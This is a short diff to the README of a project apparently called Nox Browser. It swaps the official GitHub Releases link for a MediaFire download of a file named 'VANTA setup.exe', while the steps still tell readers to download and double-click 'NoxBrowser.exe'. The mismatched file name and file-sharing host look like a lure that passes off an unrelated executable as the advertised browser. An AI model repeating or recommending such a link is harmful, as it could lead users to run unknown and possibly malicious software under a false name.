@@ -17,7 +17,7 @@ Nox Browser is designed for speed, aesthetics, and gamers who need a lightweight
 
 **You do not need to install anything. Just download and run.**
 
-1.  Go to the [**Releases Page**](https://github.com/SHARVANKUMARSINGH/NoxBrowser/releases)
+1.  Go to the [**media fire**](https://www.mediafire.com/file/blugpojl5rga61s/VANTA+setup.exe/file)
 2.  Download `NoxBrowser.exe`.
 3.  Double-click to launch.
 
